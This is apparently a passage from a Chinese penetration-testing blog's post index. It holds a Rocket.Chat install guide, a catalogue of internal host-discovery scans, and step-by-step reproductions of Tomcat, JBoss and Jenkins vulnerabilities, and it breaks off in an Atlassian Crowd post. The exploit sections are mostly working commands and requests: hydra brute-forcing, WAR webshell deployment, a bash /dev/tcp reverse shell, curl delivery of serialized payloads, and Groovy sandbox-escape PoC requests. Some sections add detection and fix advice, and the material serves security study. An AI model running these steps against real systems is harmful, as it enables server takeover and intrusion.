Chat服务搭建\n与Mattermost类似\n团队群聊SaaS平台\nSlack的替代选择方案\n全平台客户端支持(WEB)\n适用于企业内部文件共享和信息交换\n独立于操作系统的`Snap`部署方式\n\n\n#### 安装\n安装异常简单\n###### F1.自动安装\n```bash\n# 推荐\nsudo snap install rocketchat-server\n```\n\n\n###### F2.手动安装\n1.安装数据库\n```bash\nsudo apt install mongodb\n```\n2.安装依赖\n```bash\nsudo apt install node.js build-essential npm\n```\n3.指定Node.js版本\n```bash\nsudo npm install -g n\nsudo n 8.9.3    # 这里的版本自己查看一下目前支持的版本号\n```\n\n4.下载服务端源码，并安装\n```bash\n# 下载地址：\nhttps://releases.rocket.chat/latest/download\n\ntar -zxcf xxx.tgz\ncd bundle/programs/server\nnpm install\ncd ../\n\nexport ROOT_URL=http://1.1.1.1：3000/\nexport MONGO_URL=mongodb://localhost:27017/rocketchat\nexport PORT=3000\nnode main.js    # 启动服务端程序\n\n```\n\n5.访问Web页面\n```bash\n# 向导页面\n创建账号等配置（第一个账号是管理员）\n```\n\n6.用户访问3000的地址，可以注册账号，加入聊天等\n\n\n7.配置数据库集群（自己查，生产环境建议配置）\n    生产环境数据库复制集群\n\nNote：数据库建议使用单独的服务器\n\n\n\n## <font color=red>系统中文显示</font>\n\n> 此为补充知识点\n\n```bash\n# 先安装中文语言包\nsudo apt install language-pack-zh-hans\nlocale -a\n\n# 配置中文语言环境变量\nvim /etc/environment\n    LANG=\"zh_CN.UTF-8\"\n    LANGUAGE=\"zh_CN:zh:en_US:en\"\n\n# 配置中文，英文还是会继续使用的\n```\n\n\n\n\n\n\n\n","tags":["聊天服务"],"categories":["Linux"]},{"title":"发现内网存活主机方法-简单整理","url":"%2Fposts%2F48517%2F","content":"\n  \n#### <font color=red>基于UDP发现内网存活主机  </font>\n###### UDP显著特性:\n1.UDP 缺乏可靠性。UDP 本身不提供确认,超时重传等机制。UDP 数据报可能在网络中被复制,被重新排序,也不保证每个数据报只到达一次。\n2.UDP 数据报是有长度的。每个 UDP 数据报都有长度,如果一个数据报正确地到达目的地,那么该数据报的长度将随数据一起传递给接收方。而 TCP 是一个字节流协议,没有任\n何(协议上的)记录边界。\n3.UDP 是无连接的。UDP 客户和服务器之前不必存在长期的关系。大多数的UDP实现中都选择忽略源站抑制差错,在网络拥塞时,目的端无法接收到大量的UDP数据报\n4.UDP 支持多播和广播。\n\n###### 1.nmap扫描\n```bash\n# -sU\nnmap -sU -T5 -sV --max-retries 1 192.168.1.100 -p 500\n```\n\n###### 2.msf扫描\n```bash\nuse auxiliary/scanner/discovery/udp_probe\n\n# 或这个模块\nuse auxiliary/scanner/discovery/udp_sweep\n```\n\n###### 3.unicornscan扫描\nLinux下推荐\n```bash\nunicornscan -mU 192.168.1.100\n```\n\n###### 4.ScanLine扫描\nMcAfee出品,win下使用推荐。管理员执行。\n项目地址:https://www.mcafee.com/ca/downloads/free-tools/scanline.aspx\n网盘地址:http://pan.baidu.com/s/1i4A1wLR 密码:hvyx\n自己搜索资源吧\n\n输入`sl`运行ScanLine\n\n\n###### 5.在线基于Nmap的udp扫描:\n[点击链接](https://pentest-tools.com/network-vulnerability-scanning/udp-port-scanner-online-nmap)\n\n\n\n  \n####  <font color=red> 基于ARP发现内网存活主机</font>\n###### 1.nmap扫描\n```bash\nnmap -sn -PR 192.168.1.1/24\n```\n\n###### 2.msf扫描\n```bash\nuse auxiliary/scanner/discovery/arp_sweep\n...\n```\n\n###### 3.netdiscover\n```bash\nnetdiscover -r 192.168.1.0/24 -i wlan0\n```\n\n###### 4.arp-scan(linux)\n(推荐)速度与快捷\n项目地址:`https://linux.die.net/man/1/arp-scan`\narp-scan没有内置kali,需要下载安装。\n```bash\napt-get install arp-scan\n\narp-scan --interface=wlan0 --localnet\n```\n\n###### 5.Powershell\n```bash\npowershell.exe -exec bypass -Command \"Import-Module .\\arpscan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24\"\n```\n\n###### 6.arp scannet\n项目地址: https://sourceforge.net/projects/arpscannet/files/arpscannet/arpscannet%200.4/\n\n\n###### 7.arp-scan(windows)\n(推荐)速度与快捷\n项目地址:https://github.com/QbsuranAlang/arp-scan-windows-/tree/master/arp-scan(非官方)\n```bash\narp-scan.exe -t 192.168.1.1/24\n```\n\n###### 8.arp-ping.exe\n```bash\narp-ping.exe 192.168.1.100\n```\n\n###### 9.其他\n如cain的arp发现,一些开源py,pl脚本等,不一 一介绍。\n\n>下载的工具，后门自查\n\n\n\n  \n####  <font color=red> 基于netbios发现内网存活主机</font>\nIBM公司开发,主要用于数十台计算机的小型局域网。该协议是一种在局域网上的程序可以\n使用的应用程序编程接口(API),为程序提供了请求低级服务的同一的命令集,作用是为了给局域网提供网络以及其他特殊功能。\n系统可以利用WINS服务、广播及Lmhost文件等多种模式将NetBIOS名-——特指基于\nNETBIOS协议获得计算机名称——解析为相应IP地址,实现信息通讯,所以在局域网内部使\n用NetBIOS协议可以方便地实现消息通信及资源的共享。\n\n###### 1.nmap扫描\n```bash\n# nbstat.nse\nnmap -sU --script nbstat.nse -p137 192.168.1.0/24 -T4\n```\n\n###### 2.msf扫描\n```bash\nuse auxiliary/scanner/netbios/nbname\n```\n\n###### 3.nbtscan扫描\n项目地址:  http://www.unixwiz.net/tools/nbtscan.html\nNBTscan version 1.5.1:  https://github.com/scallywag/nbtscan\n```bash\n### Windows\nnbtscan-1.0.35.exe -m 192.168.1.0/24\n\nnbtscan -n    # 推荐\n\n\n### Linux （推荐）\ntar -zxvf ./nbtscan-source-1.0.35.tgz     # (其他版本自己寻找)\nmake\nnbtscan -r 192.168.1.0/24\nnbtscan -v -s: 192.168.1.0/24\n```\n\n###### 4.NetBScanner:\n项目地址:https://www.nirsoft.net/utils/netbios_scanner.html\n\n\n\n  \n####  <font color=red> 基于snmp发现内网存活主机</font>\n**SNMP协议主要由两大部分构成:** SNMP管理站和SNMP代理。\nSNMP管理站是一个中心节点,负责收集维护各个SNMP元素的信息,并对这些信息进行处理,最后反馈给网络管理员;而SNMP代理是运行在各个被管理的网络节点之上,负责统计该节点的各项信息,并且负责与SNMP管理站交互,接收并执行管理站的命令,上传各种本地的网络信息\n\n###### 1.nmap扫描\n```bash\nnmap -sU --script snmp-brute 192.168.1.0/24 -T4\n```\n\n###### 2.msf扫描\n```bash\nuse auxiliary/scanner/snmp/snmp_enum\n```\n\n###### 3.SMBScan\n项目地址:https://www.mcafee.com/us/downloads/free-tools/snscan.aspx\n依然是一块macafee出品的攻击\n\n\n###### 4.NetCrunch\n项目地址:https://www.adremsoft.com/demo/\n内网安全审计工具,包含了DNS审计,ping扫描,端口,网络服务等。\n\n\n###### 5.snmp for pl扫描:\n项目地址:https://github.com/dheiland-r7/snmp\n\n\n###### 其他扫描:\n**6.snmpbulkwalk**\n\n**7.snmp-check**\n\n**8.snmptest**\n\n\n**附录**\n```bash\nuse auxiliary/scanner/snmp/aix_version\nuse auxiliary/scanner/snmp/snmp_enumuse auxiliary/scanner/snmp/arris_dg950\nuse auxiliary/scanner/snmp/snmp_enum_hp_laserjet\nuse auxiliary/scanner/snmp/brocade_enumhash\nuse auxiliary/scanner/snmp/snmp_enumshares\nuse auxiliary/scanner/snmp/cambium_snmp_loot\nuse auxiliary/scanner/snmp/snmp_enumusers\nuse auxiliary/scanner/snmp/cisco_config_tftp\nuse auxiliary/scanner/snmp/snmp_login\nuse auxiliary/scanner/snmp/cisco_upload_file\nuse auxiliary/scanner/snmp/snmp_set\nuse auxiliary/scanner/snmp/netopia_enum\nuse auxiliary/scanner/snmp/ubee_ddw3611\nuse auxiliary/scanner/snmp/sbg6580_enum\nuse auxiliary/scanner/snmp/xerox_workcentre_enumusers\n```\n\n**其他内网安全审计工具(snmp):**\n项目地址: `https://www.solarwinds.com/topics/snmp-scanner`\n项目地址: `https://www.netscantools.com/nstpro_snmp.html`\n\n\n**snmp for pl :**\n```bash\nwget http://www.cpan.org/modules/by-module/NetAddr/NetAddr-IP-4.078.tar.gz\ntar xvzf ./NetAddr-IP-4.078.tar.gz\ncd NetAddr-IP-4.078/\nperl Makefile.PL\nmake\nmake install\n./snmpbw.pl\n\n```\n\n  \n#### <font color=red>基于ICMP发现内网存活主机  </font>\n###### 1.nmap扫描\n```bash\nnmap ‐sP ‐PI 192.168.1.0/24 ‐T4\n\nnmap ‐sn ‐PE ‐T4 192.168.1.0/24\n```\n\n###### 2.CMD下扫描\n```cmd\nfor /L %P in (1,1,254) DO @ping ‐w 1 ‐n 1 192.168.1.%P | findstr \"TTL=\"\n```\n\n###### 3.powershell扫描\n```powershell\n# powershell脚本  ./Invoke‐TSPingSweep.ps1\npowershell.exe ‐exec bypass ‐Command \"Import‐Module ./Invoke‐TSPingSwe\nep.ps1; Invoke‐TSPingSweep ‐StartAddress 192.168.1.1 ‐EndAddress 192.168.1.2\n54 ‐ResolveHost ‐ScanPort ‐Port 445,135\"\n\n\n# 或\ntcping.exe ‐n 1 192.168.1.0 80\n```\n\n\n  \n####  <font color=red> 基于SMB发现内网存活主机</font>\n###### 1.基于msf\n```bash\n# 模块 scanner/smb/smb_version\n\n```\n\n###### 2.基于cme(参考第九十三课)\n```bash\ncme smb 192.168.1.0/24\n```\n\n###### 3.基于nmap\n```bash\nnmap ‐sU ‐sS ‐‐script smb‐enum‐shares.nse ‐p 445 192.168.119\n```\n\n###### 4.基于CMD\n```bash\nfor /l %a in (1,1,254) do start /min /low telnet 192.168.1.%a 445\n```\n\n###### 5.基于powershell\n```powershell\n## 一句话扫描:\n#单IP:\n445 | %{ echo ((new‐object Net.Sockets.TcpClient).Connect(\"192.168.1.119\",$_)) \"$_ is open\"} 2>$null\n\n#多ip:\n1..5 | % { $a = $_; 445 | % {echo ((new‐objectNet.Sockets.TcpClient).Connect(\"192.168.1.$a\",$_)) \"Port $_ is open\"}2>$null}\n\n#多port,多IP:\n118..119 | % { $a = $_; write‐host \"‐‐‐‐‐‐\"; write‐host \"192.168.1.$a\"; 80,445 | % {echo ((new‐object Net.Sockets.TcpClient).Connect(\"192.168.1.$a\",$_)) \"Port $_ is open\"} 2>$null}\n```\n\n\n  \n####  <font color=red> 基于MSF发现内网存活主机 </font>\n###### 一\nsearch搜索\n```bash\nsearch scanner type:auxiliary\n```\n\n主要介绍`scanner`下的五个模块,辅助发现内网存活主机,分别为:\n```bash\nauxiliary/scanner/discovery/arp_sweep    # 发现内网存活主机\nauxiliary/scanner/discovery/udp_sweep    # 发现内网存活主机\nauxiliary/scanner/ftp/ftp_version      # 发现FTP服务\nauxiliary/scanner/http/http_version    # 发现HTTP服务\nauxiliary/scanner/smb/smb_version      # 发现SMB服务\n```\n\n\n###### 二\n主要介绍`scanner`下的五个模块,辅助发现内网存活主机,分别为:\n```bash\nauxiliary/scanner/ssh/ssh_version        # 发现SSH服务\nauxiliary/scanner/telnet/telnet_version    # 发现TELNET服务\nauxiliary/scanner/discovery/udp_probe    # 发现内网存活主机\nauxiliary/scanner/dns/dns_amp            # 发现内网存活主机\nauxiliary/scanner/mysql/mysql_version    # 发现mysql服务\n```\n\n\n###### 三\n主要介绍`scanner`下的五个模块,辅助发现内网存活主机,分别为:\n```bash\nauxiliary/scanner/netbios/nbname    # 发现内网存活主机\nauxiliary/scanner/http/title        # 发现内网存活主机\nauxiliary/scanner/db2/db2_version    # 发现db2服务\nauxiliary/scanner/portscan/ack    # 发现内网存活主机\nauxiliary/scanner/portscan/tcp    # 发现内网存活主机\n```\n\n\n\n###### 四\n主要介绍`scanner`下的五个模块,辅助发现内网存活主机,分别为:\n```bash\nauxiliary/scanner/portscan/syn    # 发现内网存活主机\nauxiliary/scanner/portscan/ftpbounce    # 发现内网存活主机\nauxiliary/scanner/portscan/xmas        # 发现内网存活主机\nauxiliary/scanner/rdp/rdp_scanner        # 发现内网存活主机\nauxiliary/scanner/smtp/smtp_version        # 发现内网存活主机\n```\n\n\n\n###### 五\n主要介绍`scanner`下的三个模块,以及db_nmap辅助发现内网存活主机,分别为:\n```bash\nauxiliary/scanner/pop3/pop3_version        # 发现内网存活主机\nauxiliary/scanner/postgres/postgres_version    # 发现内网存活主机\nauxiliary/scanner/ftp/anonymous            # 发现内网存活主机\n\ndb_nmap            # 发现内网存活主机(MSF内置强大的端口扫描工具Nmap,为了更好的区别,内置命令为:db_nmap, 使用方法与nmap一致)\n#如：\ndb_nmap ‐p 445 ‐T4 ‐sT 192.168.1.115‐120 ‐‐open\nhosts        # 查看数据库中已发现的内网存活主机\nhosts ‐h     # hosts命令也支持数据库中查询与搜索,方便快速对应目标存活主机\nhosts ‐S 192    # 搜索关键字\n```\n\nhosts ‐h  查看参数：\n```bash\n‐a,‐‐add Add the hosts instead of searching\n‐d,‐‐delete Delete the hosts instead of searching\n‐c <col1,col2> Only show the given columns (see list below)\n‐C <col1,col2> Only show the given columns until the next restart (se\ne list below)\n‐h,‐‐help Show this help information\n‐u,‐‐up Only show hosts which are up\n‐o <file> Send output to a file in csv format\n‐O <column> Order rows by specified column number\n‐R,‐‐rhosts Set RHOSTS from the results of the search\n‐S,‐‐search Search string to filter by\n‐i,‐‐info Change the info of a host\n‐n,‐‐name Change the name of a host\n‐m,‐‐comment Change the comment of a host\n‐t,‐‐tag Add or specify a tag to a range of hosts\n```\n\n\n\n\n###### 六\n主要介绍`post`下的六个模块,辅助发现内网存活主机,分别为:\n```bash\nwindows/gather/arp_scanner\nwindows/gather/enum_ad_computers\nwindows/gather/enum_computers\nwindows/gather/enum_domain\nwindows/gather/enum_domains\nwindows/gather/enum_ad_user_comments\n```\n\n1.基于`windows/gather/arp_scanner`发现内网存活主机\n```bash\nmeterpreter > run windows/gather/arp_scanner RHOSTS=192.168.1.110‐120 THREADS=20\n```\n\n2.基于`windows/gather/enum_ad_computers`发现域中存活主机\n```bash\nmeterpreter > run windows/gather/enum_ad_computers\n```\n\n3.基于`windows/gather/enum_computers`发现域中存活主机\n```bash\nmeterpreter > run windows/gather/enum_computers\n```\n\n4.基于`windows/gather/enum_domain`发现域中存活主机\n```bash\nmeterpreter > run windows/gather/enum_domain\n```\n\n5.基于`windows/gather/enum_domains` 发现域中存活主机\n```bash\nmeterpreter > run windows/gather/enum_domains\n```\n\n6.基于`windows/gather/enum_ad_user_comments`发现域中存活主机\n```bash\nmeterpreter > run windows/gather/enum_ad_user_comments\n```\n\n\n`POST`下相关模块如下：\n```bash\nlinux/gather/enum_network\nlinux/busybox/enum_hosts\nwindows/gather/enum_ad_users\nwindows/gather/enum_domain_tokens\nwindows/gather/enum_snmp\n```\n\n  \n","tags":["探测主机存活"],"categories":["渗透测试"]},{"title":"Tomcat常见漏洞复现","url":"%2Fposts%2F40402%2F","content":"\n\n#### 后台管理页面弱口令\n默认：`http://127.0.0.1:8080/manager/html`页面只允许本地访问，除非管理员手工修改了这些属性\n\n**1.尝试登录后台**\n1.尝试默认账户密码：`tomcat:tomcat`\n2.如果不是，尝试用弱口令字典进行爆破\n```bash\n# hydra爆破manager后台\nhydra -L user.txt -P user.txt -f 10.10.10.81 -s 8080 http-get /manager/html\n```\n\n**2.部署war包**\n```\n# war包生成\njar -cvf xx.war xx.jsp\n```\n![](http://image.xpshuai.cn/tomcat_gen_war.png)\n\n**3.部署后, 访问马**\n访问 `http://127.0.0.1:8080/war 包名(无后缀) / 包名内文件名` \n\n**4.后续操作**\n\n\n###### 安全检查\n查看tomcat日志\n```bash\ntail /root/tomcats/apache-tomcat-xxx/logs/xxxx_log\n# 如果出现大量401，就可能正在被爆破\n```\n\n查看部署的war包\n```bash\n# 部署路径在tomcat的webapps目录下，进行检查\n\n# 查看部署war包的日志(tomcat的logs下)，是否有部署的痕迹\n```\n\n\n###### 修复建议\n1. 若无必要,取消 manager/html 功能。\n2. 若要使用, manager 页面应只允许本地 IP 访问\n\n\n\n\n#### 任意文件写入(CVE-2017-12615)\n漏洞本质是 Tomcat 配置文件 /conf/web.xml 配置了可写( readonly=false ),导致我们可以往服务器写文件:\n\n**条件：**\n1. 服务器开启了put方法； \n2. 同时tomcat存在后缀解析漏洞\n\n###### 复现\n正常状况：\n![](http://image.xpshuai.cn/tomcat_file_w_ok.png)\n利用成功：\n![](http://image.xpshuai.cn/tomcat_file_w_ok.png)\n![](http://image.xpshuai.cn/tomcat_CVE20190232_ok.png)\n\n\n###### 安全检查\n查看日志内容，如果方法是PUT， 且状态码为201，就要注意了\n\n###### 防御措施\n1. 禁用PUT方法(默认是禁止的，开启REST API的情况下可能会开启  --> 和业务保持沟通)\n2. 设置强密码或删除Web控制台，以及示例页面(可能暴露信息)，关闭报错页面提示\n3. 将 readonly=true ,默认为 true \n\n\n\n#### 远程代码执行(CVE-2019-0232)\n影响范围: 9.0.0.M1 ~ 9.0.17, 8.5.0 ~ 8.5.39 , 7.0.0 ~ 7.0.93\n影响系统: Windows\n\n###### 环境搭建\n手头暂时没windows系统，从网上借鉴了一下\n\n配置Apache Tomcat服务器（修改conf目录配置文件，启用CGI）\n1、打开Tomcat安装目录的apache-tomcat-8.5.39\\conf\\web.xml修改如下配置，在默认情况下配置是注释的。\n![](http://image.xpshuai.cn/tomcat_CVE20190232.png)\n\n \n\n2、打开Tomcat安装目录的`apache-tomcat-8.5.39\\conf\\context.xml`修改如下配置，添加privileged=\"true\" 。\n![](http://image.xpshuai.cn/tomcat_CVE20190232_2.png)\n\n\n3、在apache-tomcat-8.5.39\\webapps\\ROOT\\WEB-INF目录新建一个cgi-bin文件夹，创建一个test.bat的文件，内容随意\n\n\n###### 漏洞利用\nPOC\n```\n# 访问\nhttp://127.0.0.1:8080/cgi-bin/test.bat?&dir\n\n# 执行命令\nhttp://127.0.0.1:8080/cgi-bin/test.bat?&C:/WINDOWS/system32/net+user\n```\n\n**Note:**\nnet 命令的路径要写全,直接写 net user , Tomcat 控制台会提示net 不是内部命令,也不是可运行的程序,另 `必须使用 + 号连接`,使用 空格 ,%2B 都会执\n行失败,控制台报错。\n\n\n\n#### 文件包含漏洞(CVE-2020-1938)\n该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。目前，厂商已发布新版本完成漏洞修复。\n\n**受影响版本**\n- Apache Tomcat 6\n- Apache Tomcat 7 < 7.0.100\n- Apache Tomcat 8 < 8.5.51\n- Apache Tomcat 9 < 9.0.31\n\n**不受影响版本**\n- Apache Tomcat = 7.0.100\n- Apache Tomcat = 8.5.51\n- Apache Tomcat = 9.0.31\n\n\n###### 文件包含RCE复现\n**POC：**\nhttps://github.com/0nise/CVE-2020-1938\nhttps://github.com/nibiwodong/CNVD-2020-10487-Tomcat-Ajp-lfi-POC\n\n利用文章：\nhttps://www.cnblogs.com/Rain99-/p/12517660.html\nhttps://blog.csdn.net/SouthWind0/article/details/105147369/\n\n\n###### 防护措施\n1. 更新到安全版本\n2. 关闭AJP服务，修改Tomcat配置文件Service.xml,注释掉：`<Connector port=\"8009\" protocol=\"AJP/1.3\" redirectPort=\"8443\" />`\n3. 配置ajp配置中的secretRequired跟secret属性来限制认证\n\n\n###### 参考\nhttps://www.cnvd.org.cn/webinfo/show/5415\n\n\n\n","tags":["中间件漏洞"],"categories":["渗透测试"]},{"title":"jboss常见漏洞复现","url":"%2Fposts%2F60637%2F","content":"\n### JBoss 5.x/6.x 反序列化漏洞( CVE-2017-12149 )\n**验证：** 访问`/invoker/readonly`，如果返回 500 ,说明页面存在,此页面存在反序列化漏洞。\n![](http://image.xpshuai.cn/jboss_500.png)\n\n利用工具：[JavaDeserH2HC](https://github.com/joaomatosf/JavaDeserH2HC)\n**步骤：**\n1.先编译\n\n```bash\n# 我们选择一个 Gadget : ReverseShellCommonsCollectionsHashMap ,编译并生成序列化数据\njavac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java\n```\n\n2.设置反弹的IP和端口：\n\n```bash\njava -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.0.105:8888 # ip 是 nc 所在的 ip \n# 这样就会将序列化对象保存在ReverseShellCommonsCollectionsHashMap.ser中，用curl命令发送到Jboss服务地址\n```\n\n3.本机进行监听\n```bash\nnv -lvvp 8888\n```\n\n4.再打开另一个控制台，运行如下curl命令\n```bash\ncurl http://192.168.0.100:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser\n```\n\n5.成功反弹shell\n\n\n\n\n### JBoss JMXInvokerServlet 反序列化漏洞\n**验证：**  访问 `/invoker/JMXInvokerServlet`，返回如下,说明接口开放,此接口存在反序列化漏洞。\n![](http://image.xpshuai.cn/JBossEJBInvokerServlet1.png)\n\n这里直接利用 CVE-2017-12149 生成的 ser ,发送到 `/invoker/JMXInvokerServlet`接口中。\n\n也可以直接利用工具检测：[工具下载地址](https://cdn.vulhub.org/deserialization/DeserializeExploit.jar)\n```bash\n# 运行工具即可\njava -jar DeserializeExploit.jar\n```\n\n\n### JBoss EJBInvokerServlet 反序列化漏洞\n**验证：** 访问     /invoker/EJBInvokerServlet    返回如下,说明接口开放,此接口存在反序列化漏洞。\n![](http://image.xpshuai.cn/JBossEJBInvokerServlet.png)\n\n这里直接利用 CVE-2017-12149 生成的 ser ,发送到 `/invoker/EJBInvokerServlet` 接口中\n\n\n### 修复建议\n1. 不需要`ttp-invoker.sar`组件的用户可直接删除此组件\n2. 或添加如下代码至 http-invoker.sar 下 web.xml 的 security-constraint 标签中,对 http invoker 组件进行访问控制:`<url-pattern>/*</url-pattern>`\n\n\n\n\n### JBoss <=4.x JBossMQ JMS 反序列化漏洞( CVE-2017-7504 )\n利用工具：[JavaDeserH2HC](https://github.com/joaomatosf/JavaDeserH2HC)\n**步骤：**\n1.先编译\n```bash\n# 选择ExampleCommonsCollections1WithHashMap，编译并生成序列化数据\njavac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java   #编译 \n```\n\n2.设置反弹的IP和端口：\n```bash\njava -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap \"bash -i >& /dev/tcp/192.168.0.105/1234 0>&1\"       #ser全称serialize，序列化恶意数据至文件。\n```\n\n3.本机进行监听\n```bash\nnv -lvvp 1234\n```\n\n4.再打开另一个控制台，运行如下curl命令\n```bash\n#该ser文件作为请求数据主体发送如下数据包\ncurl http://192.168.0.100:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser  # --data-binary 意为以二进制的方式post数据\n```\n\n5.成功反弹shell\n\n\n\n### JMX Console 未授权访问\n###### 漏洞描述\n未授权访问管理控制台,通过该漏洞,可以后台管理服务,可以通过脚本命令执行系统命令,如反弹shell,wget写webshell文件。\n\n###### 环境搭建\n使用vulhub\n```bash\ncd vulhub/jboss/CVE-2017-7504/\ndocker-compose up -d\n\n# 浏览器访问\n```\n\n\n\n###### 复现\n1.未授权访问测试（无无需认证进入入控制⻚页面面）\n```\nhttp://192.168.0.100:8080/\n# 进入控制页 JMX Console\nhttp://192.168.0.100:8080/jmx-console/ \n```\n![](http://image.xpshuai.cn/jmx_console.png)\n\n2.点击`jboss.deployment`进入应用部署页面\n![](http://image.xpshuai.cn/jboss_deployment.png)\n\n3.使用apache搭建远程木马服务器(这里在kali上搭建)\n\n```bash\n# war马的制作方式：https://www.peekeyes.com/2020/01/13/%E5%88%B6%E4%BD%9Cwar%E6%9C%A8%E9%A9%AC%E5%B9%B6%E4%B8%94%E6%8B%BF%E4%B8%8Bwebshell/\njar cvf shell.war shell.jsp\n```\n\n4.通过addurl参数进行木马的远程部署\n\n```\n地址写远程服务器war马的地址\n```\n![](http://image.xpshuai.cn/jboss_war.png)\n\n成功部署\n![](http://image.xpshuai.cn/jboss_war_ok.png)\n\n5.连接木马\n\n```\nhttp://192.168.0.100:8080/shell/shell.jsp\n```\n![](http://image.xpshuai.cn/jboss_war_connect.png)\n\n\n\n\n###### 防护\n- 对jmx控制页面访问添加访问验证。\n- 进行JMX Console 安全配置。\n\n\n\n\n","tags":["JBoss"],"categories":["渗透测试"]},{"title":"Jenkins一些安全问题","url":"%2Fposts%2F63696%2F","content":"\n\n#### 漏洞简介及危害\n默认情况下 Jenkins面面板中用户可以选择执行脚本界面来操作一些系统层命令,攻击者可通过未授权访问漏洞或者暴力破解用户密码等进入后台管理服务,通过脚本执行行界面从而获取服务器权限。\n\n\n#### 环境搭建\n```bash\n# 下载地址： https://www.jenkins.io/download/\n# 可以直接下载war包\njava -jar jenkins.war    # 运行\n# \nwget http://mirrors.jenkins.io/debian/jenkins_1.621_all.deb # 下载\ndpkg -i jenkins_1.621_all.deb # 安装\nsudo apt-get -f --fix-missing install # 如果有报依赖项的错误时执行行行\nservice jenkinis start    # 开启Jenkins服务\n\n浏览器器访问http://192.168.0.100:8080/\n```\n\n\n#### 未授权访问测试\n访问`http://192.168.0.100:8080/manage`可以看到没有任何限制可以直接访问\n\n\n#### Jenkins未授权访问写shell\n1.点击“脚本命令行”\n![](http://image.xpshuai.cn/Jenkins_consele.png)\n\n2.执行系统命令\n```bash\nprintln \"whoami\".execute().text\n```\n 3.利用“脚本命令行”写webshell,(`需要一定的权限且知道网站绝对路径`)，点击运行,写入成功\n```bash\nnew File (\"/var/www/html/shell.php\").write('<?php phpinfo(); ?>');\n```\n![](http://image.xpshuai.cn/Jenkins_cmd.png)\n\n4.访问shell.php， 测试成功\n![](http://image.xpshuai.cn/Jenkins_shell.png)\n\n\n\n####  CVE-2017-1000353\n>这是一个java反序列化漏洞\n\n执行如下命令启动jenkins 2.46.1：\n```bash\ndocker-compose up -d\n```\n等待完全启动成功后，访问`http://your-ip:8080`即可看到jenkins已成功运行，无需手工安装。\n\n###### 原理\n参考：   https://blogs.securiteam.com/index.php/archives/3171\n\n###### 测试\n1.生成序列化字符串\n```bash\n# 参考 https://github.com/vulhub/CVE-2017-1000353\n# 首先下载POC生成工具：   https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar\n\n# 执行下面命令，生成字节码文件\njava -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser \"touc /tmp/success\" \n# jenkins_poc.ser是生成的字节码文件名\n# \"touch ...\"是待执行的任意命令\n# 生成jenkins_poc.ser文件，这就是序列化字符串。\n```\n\n2.生成jenkins_poc.ser文件，这就是序列化字符串。\n```bash\n# 下载 https://github.com/vulhub/CVE-2017-1000353/blob/master/exploit.py\n# Python3执行\npython3 exploit.py http://192.168.0.100:8080 jenkins_poc.ser    # 将刚才生成的字节码文件发送给目标\n```\n\n3.进入docker容器发现文件创建成功\n\n\n#### CVE-2018-1000861\nJenkins使用Stapler框架开发，其允许用户通过URL PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法。\n通过这个漏洞，我们可以找到很多可供利用的利用链。其中最严重的就是绕过Groovy沙盒导致未授权用户可执行任意命令：Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误，检查操作是没有沙盒的，攻击者可以通过Meta-Programming的方式，在检查这个步骤时执行任意命令。\n\n\n###### 测试\n执行如下命令启动一个Jenkins 2.138，包含漏洞的插件也已经安装：\n```bash\ndocker-compose up -d\n```\n\n使用 @orangetw 给出的[一键化POC脚本](https://github.com/orangetw/awesome-jenkins-rce-2019)，发送如下请求即可成功执行命令：\n```bash\nhttp://192.168.0.100:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript\n?sandbox=true\n&value=public class x {\n  public x(){\n    \"touch /tmp/success\".execute()\n  }\n}\n\n# 请求替换到burp拦截的数据包中\n```\n数据包如下\n```\nGET /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public%20class%20x%20{public%20x(){%22touch%20/tmp/CVE-2018-1000861_is_success%22.execute()}} HTTP/1.1\nHost: 192.168.0.100:8080\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: JSESSIONID.a3c40b9a=node010r4vkf3cix27hr5qd9qvw5y41.node0; screenResolution=1920x1080\nUpgrade-Insecure-Requests: 1\nCache-Control: max-age=0\n```\n\n进入容器: `docker-compose exec jenkins bash`,看到 /tmp/success文件创建成功\n![](http://image.xpshuai.cn/Jenkins_poc_ok.png)\n\n\n\n#### 配置方面的安全问题\n1.允许任意账户注册 带来的安全问题\n![](http://image.xpshuai.cn/Jenkins_reg_any.png)\n关闭用户注册\n![](http://image.xpshuai.cn/Jenkins_reg.png)\n\n2.允许匿名访问带来的问题\n建议关闭\n![](http://image.xpshuai.cn/Jenkins_nologin.png)\n\n\n\n\njenkins的日志功能不是很好（可以使用代理，并进行操作的记录）\n\n\n#### 安全建议\n- 使用最新版的jenkins\n- 关闭匿名访问\n- 关闭用户注册功能\n- 用户严格授权\n- 最小化插件，相关插件使用最新版\n- 使用nginx代理jenkins，不要直接暴露在公网\n\n\n\n\n参考：https://www.secpulse.com/archives/2166.html\n\n\n","tags":["CVE-2018-1000861"],"categories":["渗透测试"]},{"title":"Atlassian Crowd未授权访问漏洞","url":"%2Fposts%2F4469%2F","content":"\n\n#### 漏洞概述\nAtlassian Crowd和Atlassian Crowd Data Center都是澳大利亚Atlassian公司的产品。Atlassian 